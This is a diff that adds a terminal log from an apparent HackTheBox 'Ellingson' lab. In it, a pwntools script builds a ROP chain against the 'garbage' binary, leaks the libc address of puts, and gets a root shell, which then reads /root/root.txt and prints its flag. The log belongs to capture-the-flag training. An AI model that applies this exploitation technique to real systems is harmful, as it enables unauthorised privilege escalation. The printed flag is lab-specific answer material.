@@ -1,0 +1,40 @@
+root@kali:~/HTB/Ellingson/ex# python stage1.py
+[+] Connecting to ellingson.htb on port 22: Done
+[*] margo@ellingson.htb:
+    Distro    Ubuntu 18.04
+    OS:       linux
+    Arch:     amd64
+    Version:  4.15.0
+    ASLR:     Enabled
+[+] Starting remote process '/bin/sh' on ellingson.htb: pid 37829
+[*] Mapping binaries
+[*] '/root/HTB/Ellingson/ex/garbage'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] Loading gadgets for '/root/HTB/Ellingson/ex/garbage'
+[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] Stage 1 ROP Chain:
+    0x0000:         0x40179b pop rdi; ret
+    0x0008:         0x404028 [arg0] rdi = got.puts
+    0x0010:         0x401050 puts
+    0x0018:         0x401619 0x401619()
+
+[*] puts address is: 0x7f59b78f69c0
+[*] offset is: 0x7f59b7884ec0
+[*] Switching to interactive mode
+
+access denied.
+$ whoami
+root
+$ cat /root/root.txt
+1cc73a448021ea81aee6c029a3d2f997
+$  
+
